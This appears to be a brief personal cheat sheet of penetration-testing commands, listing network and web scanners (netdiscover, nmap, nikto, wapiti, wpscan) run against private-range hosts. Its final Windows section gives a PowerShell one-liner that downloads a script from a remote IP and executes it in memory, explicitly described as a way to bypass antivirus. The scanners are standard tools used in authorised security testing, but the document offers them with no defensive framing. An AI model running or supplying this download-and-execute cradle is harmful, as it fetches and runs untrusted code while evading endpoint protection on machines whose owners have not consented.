# tools
few scripts and useful commands

# scan
<ul>
<li>netdiscover -r 192.168.10.130/24</li>
<li>nmap -A -sS 192.168.10.135</li>
<li>nikto -h http://192.168.10.135/site</li>
<li>wapiti http://192.168.10.134/site</li>
<li>wordpress : wpscan --url http://192.168.10.135/site</li>
</ul>

# windows
run ps1 script in memory (bypass antivirus) : powershell IEX (New-Object Net.WebClient).DownloadString('http://10.133.127.172:85/test.ps1')
